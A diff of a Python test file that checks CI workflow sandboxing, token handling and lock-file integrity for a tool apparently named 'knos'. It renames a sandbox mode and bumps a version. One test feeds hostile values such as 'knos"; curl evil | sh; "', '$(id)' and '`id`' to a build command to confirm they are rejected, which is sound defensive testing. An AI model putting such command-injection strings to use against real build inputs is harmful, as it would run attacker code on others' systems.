@@ -42,7 +42,7 @@ COMMAND = {      # each job is the install and one command
     ("fund.yml", "command"): f"knos command {EVENT}",
     ("prove.yml", "settle"): f"knos settle {EVENT}",
     ("prove.yml", "review"): f"knos review {EVENT}",
-    ("prove.yml", "judge"): 'knos proof judge --base base --pr pr --issue "$ISSUE" --changed changed.txt --sandbox require',
+    ("prove.yml", "judge"): 'knos proof judge --base base --pr pr --issue "$ISSUE" --changed changed.txt --sandbox hermetic',
     ("prove.yml", "attest"): f'knos settle --tests --pull "$PULL" --head "$HEAD" --issue "$ISSUE" {EVENT}',
     ("check.yml", "claims"): f"knos check {EVENT}",
 }
@@ -317,7 +317,7 @@ def test_the_job_that_runs_pull_request_code_can_only_read_and_hands_on_one_line
     # the token goes with that one fetch through git's environment: not on a command line, not into the clone
     assert "GIT_CONFIG_VALUE_$n=AUTHORIZATION: basic $basic" in script and "git config" not in script and "$GH_TOKEN@" not in script
     # the step that runs the pull request's code has no token, and runs it only in the sandbox
-    assert command["env"] == {"ISSUE": "${{ needs.review.outputs.tests }}"} and command["run"].endswith("--sandbox require")
+    assert command["env"] == {"ISSUE": "${{ needs.review.outputs.tests }}"} and command["run"].endswith("--sandbox hermetic")
     assert [s for s in _steps(judge) if "GH_TOKEN" in (s.get("env") or {})] == [fetch]
     assert _steps(judge).index(install) < _steps(judge).index(probe) < _steps(judge).index(command)      # checked before the code runs
     # It is the only job that has anything of a pull request on disk, with attest.yml's rerun job, which is the same judge
@@ -389,9 +389,9 @@ def test_the_judge_job_says_where_its_boundary_is_and_checks_the_sandbox_has_no_
     assert script.startswith("set -euo pipefail\n") and "${{" not in script
     assert f"setpriv --reuid={judge.SANDBOX_UID} --regid={judge.SANDBOX_UID} --clear-groups --" in script
     assert "sudo -n unshare -n -- sh -c 'ip link set lo up 2>/dev/null; exec \"$@\"' sh" in script and 'env -i "$python" -c "$probe"' in script
-    assert '"unshare", "-n"' in inspect.getsource(judge.Box.wrap) and "env\", \"-i\"" in inspect.getsource(judge.Box.wrap)
+    assert '"unshare"' in inspect.getsource(judge.Box.wrap) and '["--net"]' in inspect.getsource(judge.Box.wrap) and "env\", \"-i\"" in inspect.getsource(judge.Box.wrap)
     # and the judge refuses to run without it, whatever the probe said
-    assert COMMAND["prove.yml", "judge"].endswith("--sandbox require")
+    assert COMMAND["prove.yml", "judge"].endswith("--sandbox hermetic")
 
 
 def _stand_in(tmp_path: Path, python_says: str, unshare_works: bool = True) -> str:
@@ -1456,7 +1456,7 @@ def test_the_published_set_is_the_source_byte_for_byte_with_the_lock_written_in(
     (out / ".git" / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
     assert pub.main(["check", str(out), "--lock", str(lock)]) == 0
     prove = out / ".github" / "workflows" / "prove.yml"
-    prove.write_bytes(prove.read_bytes().replace(b"--sandbox require", b"--sandbox auto"))
+    prove.write_bytes(prove.read_bytes().replace(b"--sandbox hermetic", b"--sandbox auto"))
     (out / ".github" / "workflows" / "relay.yml").write_text("name: stray\n", encoding="utf-8")
     (out / "LICENSE").unlink()
     (out / "requirements" / "sign.txt").write_text(third_party, encoding="utf-8")          # the list without the wheel
@@ -1495,7 +1495,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.20 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.21 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1532,7 +1532,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.20 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.21 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
